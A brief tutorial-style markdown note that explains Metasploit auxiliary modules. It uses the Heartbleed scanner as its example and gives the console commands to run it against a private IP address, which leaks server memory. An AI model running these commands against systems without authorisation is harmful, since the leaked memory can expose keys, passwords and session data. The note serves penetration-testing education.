# Metasploit Auxiliary Modules

## What Are Auxiliary Modules?

In Metasploit, auxiliary modules are tools that assist in scanning, enumeration, brute-forcing, fuzzing, sniffing, and information gathering.  
They do not exploit a target directly and do not provide a shell.

## üíô Example: Heartbleed (Auxiliary Module)

Heartbleed does *not* provide remote code execution.  
It simply leaks memory via malformed SSL heartbeat packets.

    use auxiliary/scanner/ssl/openssl_heartbleed
    set RHOSTS 192.168.1.10
    set RPORT 8443
    run



It prints leaked memory but does not open a shell.
